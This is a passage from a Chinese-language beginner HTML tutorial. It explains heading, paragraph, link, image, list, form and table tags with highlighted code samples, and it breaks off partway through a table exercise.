<code>&lt;h1&gt;</code>、<code>&lt;h2&gt;</code>、<code>&lt;h3&gt;</code>、<code>&lt;h4&gt;</code>、<code>&lt;h5&gt;</code>、<code>&lt;h6&gt;</code>,标签可以在网页上定义6种级别的标题。6种级别的标题表示文档的6级目录层级关系，比如说： <code>&lt;h1&gt;</code>用作主标题，其后是 <code>&lt;h2&gt;</code>，再其次是 <code>&lt;h3&gt;</code>，以此类推。搜索引擎会使用标题将网页的结构和内容编制索引，所以网页上使用标题是很重要的。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>这是一级标题<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>这是二级标题<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h3</span>&gt;</span>这是三级标题<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="2-3-html段落标签、换行标签与字符实体"><a href="#2-3-html段落标签、换行标签与字符实体" class="headerlink" title="2.3 html段落标签、换行标签与字符实体"></a>2.3 html段落标签、换行标签与字符实体</h2><h3 id="2-3-1-html段落标签"><a href="#2-3-1-html段落标签" class="headerlink" title="2.3.1 html段落标签"></a>2.3.1 html段落标签</h3><p><code>&lt;p&gt;</code>标签定义一个文本段落，一个段落含有默认的上下间距，段落之间会用这种默认间距隔开，代码如下：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>段落<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>HTML是 HyperText Mark-up Language 的首字母简写，意思是超文本标记语言，超</span><br><span class="line">    文本指的是超链接，标记指的是标签，是一种用来制作网页的语言，这种语言由一个个的</span><br><span class="line">    标签组成，用这种语言制作的文件保存的是一个文本文件，文件的扩展名为html或者htm。</span><br><span class="line">    <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>一个html文件就是一个网页，html文件用编辑器打开显示的是文本，可以用文本的方</span><br><span class="line">    式编辑它，如果用浏览器打开，浏览器会按照标签描述内容将文件渲染成网页，显示的网</span><br><span class="line">    页可以从一个网页链接跳转到另外一个网页。<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="2-3-2-html换行标签"><a href="#2-3-2-html换行标签" class="headerlink" title="2.3.2 html换行标签"></a>2.3.2 html换行标签</h3><p>代码中成段的文字，直接在代码中回车换行，在渲染成网页时候不认这种换行，如果真想换行，可以在代码的段落中插入<code>&lt;br /&gt;</code>来强制换行，代码如下：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">一个html文件就是一个网页，html文件用编辑器打开显示的是文本，可以用<span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">文本的方式编辑它，如果用浏览器打开，浏览器会按照标签描述内容将文件<span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">渲染成网页，显示的网页可以从一个网页链接跳转到另外一个网页。</span><br><span class="line"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="2-3-3-html字符实体"><a href="#2-3-3-html字符实体" class="headerlink" title="2.3.3 html字符实体"></a>2.3.3 html字符实体</h3><p>代码中成段的文字，如果文字间想空多个空格，在代码中空多个空格，在渲染成网页时只会显示一个空格，如果想显示多个空格，可以使用空格的字符实体,代码如下：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--  在段落前想缩进两个文字的空格，使用空格的字符实体：&amp;nbsp;   --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">&amp;nbsp;&amp;nbsp;一个html文件就是一个网页，html文件用编辑器打开显示的是文本，可以用<span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">文本的方式编辑它，如果用浏览器打开，浏览器会按照标签描述内容将文件<span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">渲染成网页，显示的网页可以从一个网页链接跳转到另外一个网页。<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在网页上显示 “&lt;” 和 “&gt;” 会误认为是标签，想在网页上显示“&lt;”和“&gt;”可以使用它们的字符实体，比如：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- “&lt;” 和 “&gt;” 的字符实体为 &amp;lt; 和 &amp;gt;  --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">    3 &amp;lt; 5 <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    10 &amp;gt; 5</span><br><span class="line"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="2-4-html块标签、含样式的标签"><a href="#2-4-html块标签、含样式的标签" class="headerlink" title="2.4 html块标签、含样式的标签"></a>2.4 html块标签、含样式的标签</h2><h3 id="2-4-1-html块标签"><a href="#2-4-1-html块标签" class="headerlink" title="2.4.1 html块标签"></a>2.4.1 html块标签</h3><p>1、<code>&lt;div&gt;</code> 标签 块元素，表示一块内容，没有任何样式，不表示具体的语义，里面可以嵌套其他标签。<br>2、<code>&lt;span&gt;</code> 标签 行内元素，表示一行中的一小段内容，没有具体的语义。</p><h3 id="2-4-2-含样式和语义的标签"><a href="#2-4-2-含样式和语义的标签" class="headerlink" title="2.4.2 含样式和语义的标签"></a>2.4.2 含样式和语义的标签</h3><p>1、<code>&lt;em&gt;</code> 标签 行内元素，表示语气中的强调词<br>2、<code>&lt;i&gt;</code> 标签 行内元素，表示专业词汇<br>3、<code>&lt;b&gt;</code> 标签 行内元素，表示文档中的关键字或者产品名<br>4、<code>&lt;strong&gt;</code> 标签 行内元素，表示非常重要的内容</p><h3 id="2-4-3-语义化的标签"><a href="#2-4-3-语义化的标签" class="headerlink" title="2.4.3 语义化的标签"></a>2.4.3 语义化的标签</h3><p>语义化的标签，就是在布局的时候多使用有语义的标签，搜索引擎在爬网的时候能认识这些标签，理解文档的结构，方便网站的收录。比如：h1标签是表示标题，p标签是表示段落，ul、li标签是表示列表，a标签表示链接，dl、dt、dd表示定义列表等，语义化的标签不多。</p><h2 id="2-5-html图像标签、绝对路径和相对路径"><a href="#2-5-html图像标签、绝对路径和相对路径" class="headerlink" title="2.5 html图像标签、绝对路径和相对路径"></a>2.5 html图像标签、绝对路径和相对路径</h2><h3 id="2-5-1-html图像标签"><a href="#2-5-1-html图像标签" class="headerlink" title="2.5.1 html图像标签"></a>2.5.1 html图像标签</h3><p><code>&lt;img&gt;</code>标签可以在网页上插入一张图片，它是独立使用的标签，它的常用属性有：</p><ul><li>src属性 定义图片的引用地址</li><li>alt属性 定义图片加载失败时显示的文字，搜索引擎会使用这个文字收录图片、盲人读屏软件会读取这个文字让盲人识别图片，所以此属性非常重要。</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"images/pic.jpg"</span> <span class="attr">alt</span>=<span class="string">"产品图片"</span> /&gt;</span></span><br></pre></td></tr></table></figure><h3 id="2-5-2-绝对路径和相对路径"><a href="#2-5-2-绝对路径和相对路径" class="headerlink" title="2.5.2 绝对路径和相对路径"></a>2.5.2 绝对路径和相对路径</h3><p>像网页上插入图片这种外部文件，需要定义文件的引用地址，引用外部文件还包括引用外部样式表，javascript等等，引用地址分为绝对地址和相对地址。</p><ul><li>绝对地址：相对于磁盘的位置去定位文件的地址</li><li>相对地址：相对于引用文件本身去定位被引用的文件地址</li></ul><p>绝对地址在整体文件迁移时会因为磁盘和顶层目录的改变而找不到文件，相对路径就没有这个问题。相对路径的定义技巧：</p><ul><li>“ ./ ” 表示当前文件所在目录下，比如：“./pic.jpg” 表示当前目录下的pic.jpg的图片，这个使用时可以省略。</li><li>“ ../ ” 表示当前文件所在目录下的上一级目录，比如：“../images/pic.jpg” 表示当前目录下的上一级目录下的images文件夹中的pic.jpg的图片。</li></ul><h2 id="2-6-html链接标签"><a href="#2-6-html链接标签" class="headerlink" title="2.6 html链接标签"></a>2.6 html链接标签</h2><p><a>标签可以在网页上定义一个链接地址，它的常用属性有：</a></p><ul><li>href属性 定义跳转的地址</li><li>title属性 定义鼠标悬停时弹出的提示文字框</li><li>target属性 定义链接窗口打开的位置<ul><li>target=”_self” 缺省值，新页面替换原来的页面，在原来位置打开</li><li>target=”_blank” 新页面会在新开的一个浏览器窗口打开</li></ul></li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span> <span class="comment">&lt;!--  # 表示链接到页面顶部   --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"https://www.baidu.com/"</span> <span class="attr">title</span>=<span class="string">"跳转的百度网站"</span>&gt;</span>百度一下<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"2.html"</span> <span class="attr">target</span>=<span class="string">"_blank"</span>&gt;</span>测试页面2<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="2-7-html列表标签"><a href="#2-7-html列表标签" class="headerlink" title="2.7 html列表标签"></a>2.7 html列表标签</h2><h3 id="2-7-1-有序列表"><a href="#2-7-1-有序列表" class="headerlink" title="2.7.1 有序列表"></a>2.7.1 有序列表</h3><p>在网页上定义一个有编号的内容列表可以用<code>&lt;ol&gt;</code>、<code>&lt;li&gt;</code>配合使用来实现，代码如下：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ol</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>列表文字一<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>列表文字二<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>列表文字三<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ol</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在网页上生成的列表，每条项目上会按1、2、3编号，有序列表在实际开发中较少使用。</p><h3 id="2-7-2-无序列表"><a href="#2-7-2-无序列表" class="headerlink" title="2.7.2 无序列表"></a>2.7.2 无序列表</h3><p>在网页上定义一个无编号的内容列表可以用<code>&lt;ul&gt;</code>、<code>&lt;li&gt;</code>配合使用来实现，代码如下：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>新闻标题一<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>新闻标题二<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>新闻标题三<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在网页上生成的列表，每条项目上会有一个小图标，这个小图标在不同浏览器上显示效果不同，所以一般会用样式去掉默认的小图标，如果需要图标，可以用样式自定义图标，从而达到在不同浏览器上显示的效果相同,实际开发中一般用这种列表。</p><p>定义列表通常用于术语的定义。</p><dl>标签表示列表的整体。<dt>标签定义术语的题目。<dd>标签是术语的解释。一个<dl>中可以有多个题目和解释，代码如下：</dl></dd></dt></dl><p></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h3</span>&gt;</span>前端三大块<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dl</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dt</span>&gt;</span>html<span class="tag">&lt;/<span class="name">dt</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dd</span>&gt;</span>负责页面的结构<span class="tag">&lt;/<span class="name">dd</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dt</span>&gt;</span>css<span class="tag">&lt;/<span class="name">dt</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dd</span>&gt;</span>负责页面的表现<span class="tag">&lt;/<span class="name">dd</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dt</span>&gt;</span>javascript<span class="tag">&lt;/<span class="name">dt</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dd</span>&gt;</span>负责页面的行为<span class="tag">&lt;/<span class="name">dd</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dl</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="2-8-html表单"><a href="#2-8-html表单" class="headerlink" title="2.8 html表单"></a>2.8 html表单</h2><p>表单用于搜集不同类型的用户输入，表单由不同类型的标签组成，相关标签及属性用法如下：</p><p>1、<code>&lt;form&gt;</code>标签 定义整体的表单区域</p><ul><li>action属性 定义表单数据提交地址</li><li>method属性 定义表单提交的方式，一般有“get”方式和“post”方式</li></ul><p>2、<code>&lt;label&gt;</code>标签 为表单元素定义文字标注</p><p>3、<code>&lt;input&gt;</code>标签 定义通用的表单元素</p><ul><li>type属性<ul><li>type=”text” 定义单行文本输入框</li><li>type=”password” 定义密码输入框</li><li>type=”radio” 定义单选框</li><li>type=”checkbox” 定义复选框</li><li>type=”file” 定义上传文件</li><li>type=”submit” 定义提交按钮</li><li>type=”reset” 定义重置按钮</li><li>type=”button” 定义一个普通按钮</li><li>type=”image” 定义图片作为提交按钮，用src属性定义图片地址</li><li>type=”hidden” 定义一个隐藏的表单域，用来存储值</li></ul></li><li>value属性 定义表单元素的值</li><li>name属性 定义表单元素的名称，此名称是提交数据时的键名</li></ul><p>4、<code>&lt;textarea&gt;</code>标签 定义多行文本输入框</p><p>5、<code>&lt;select&gt;</code>标签 定义下拉表单元素</p><p>6、<code>&lt;option&gt;</code>标签 与<code>&lt;select&gt;</code>标签配合，定义下拉表单元素中的选项</p><p>2.8.1 <strong>注册表单实例：</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://www..."</span> <span class="attr">method</span>=<span class="string">"get"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">label</span>&gt;</span>姓名：<span class="tag">&lt;/<span class="name">label</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"username"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">label</span>&gt;</span>密码：<span class="tag">&lt;/<span class="name">label</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"password"</span> <span class="attr">name</span>=<span class="string">"password"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">label</span>&gt;</span>性别：<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"radio"</span> <span class="attr">name</span>=<span class="string">"gender"</span> <span class="attr">value</span>=<span class="string">"0"</span> /&gt;</span> 男</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"radio"</span> <span class="attr">name</span>=<span class="string">"gender"</span> <span class="attr">value</span>=<span class="string">"1"</span> /&gt;</span> 女</span><br><span class="line"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">label</span>&gt;</span>爱好：<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"checkbox"</span> <span class="attr">name</span>=<span class="string">"like"</span> <span class="attr">value</span>=<span class="string">"sing"</span> /&gt;</span> 唱歌</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"checkbox"</span> <span class="attr">name</span>=<span class="string">"like"</span> <span class="attr">value</span>=<span class="string">"run"</span> /&gt;</span> 跑步</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"checkbox"</span> <span class="attr">name</span>=<span class="string">"like"</span> <span class="attr">value</span>=<span class="string">"swiming"</span> /&gt;</span> 游泳</span><br><span class="line"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">label</span>&gt;</span>照片：<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"person_pic"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">label</span>&gt;</span>个人描述：<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">textarea</span> <span class="attr">name</span>=<span class="string">"about"</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">label</span>&gt;</span>籍贯：<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">name</span>=<span class="string">"site"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">"0"</span>&gt;</span>北京<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">"1"</span>&gt;</span>上海<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">"2"</span>&gt;</span>广州<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">"3"</span>&gt;</span>深圳<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">name</span>=<span class="string">""</span> <span class="attr">value</span>=<span class="string">"提交"</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- input类型为submit定义提交按钮  </span></span><br><span class="line"><span class="comment">     还可以用图片控件代替submit按钮提交，一般会导致提交两次，不建议使用。如：</span></span><br><span class="line"><span class="comment">     &lt;input type="image" src="xxx.gif"&gt;</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"reset"</span> <span class="attr">name</span>=<span class="string">""</span> <span class="attr">value</span>=<span class="string">"重置"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="2-9-html表格"><a href="#2-9-html表格" class="headerlink" title="2.9 html表格"></a>2.9 html表格</h2><p>1、<code>&lt;table&gt;</code>标签：声明一个表格，它的常用属性如下：</p><ul><li>border属性 定义表格的边框，设置值是数值</li><li>cellpadding属性 定义单元格内容与边框的距离，设置值是数值</li><li>cellspacing属性 定义单元格与单元格之间的距离，设置值是数值</li><li>align属性 设置整体表格相对于浏览器窗口的水平对齐方式,设置值有：left | center | right ，默认left</li></ul><p>2、<code>&lt;tr&gt;</code>标签：定义表格中的一行</p><p>3、<code>&lt;td&gt;</code>和<code>&lt;th&gt;</code>标签：定义一行中的一个单元格，td代表普通单元格，th表示表头单元格，它们的常用属性如下：</p><ul><li>align 设置单元格中内容的水平对齐方式,设置值有：left | center | right ，默认left</li><li>valign 设置单元格中内容的垂直对齐方式 top | middle | bottom ，默认top</li><li>colspan 设置单元格水平合并，设置值是数值</li><li>rowspan 设置单元格垂直合并，设置值是数值</li></ul><p>表格制作练习：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>表格<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">table</span> <span class="attr">border</span>=<span class="string">"1"</span> <span class="attr">width</span>=<span class="string">"600"</span> <span class="attr">height</span>=<span class="string">"300"</span> <span class="attr">align</span>=<span class="string">"center"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">td</span> <span class="attr">colspan</span>=<span class="string">"5"</span>&gt;</span>基本情况<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">td</span> <span class="attr">width</span>=<span class="string">"25%"</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">td</span> <span class="attr">width</span>=<span class="string">"15%"</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">td</span> <span class="attr">width</span>=<span class="string">"25%"</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">td</span> <span class="attr">width</span>=<span class="string">"15%"</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">td</span>  <span class="attr">rowspan</span>=<span class="string">"5"</span> <span class="attr">width</span>=<span class="string">"20%"</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">""</span> <span class="attr">alt</span>=<span class="string">"person"</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">     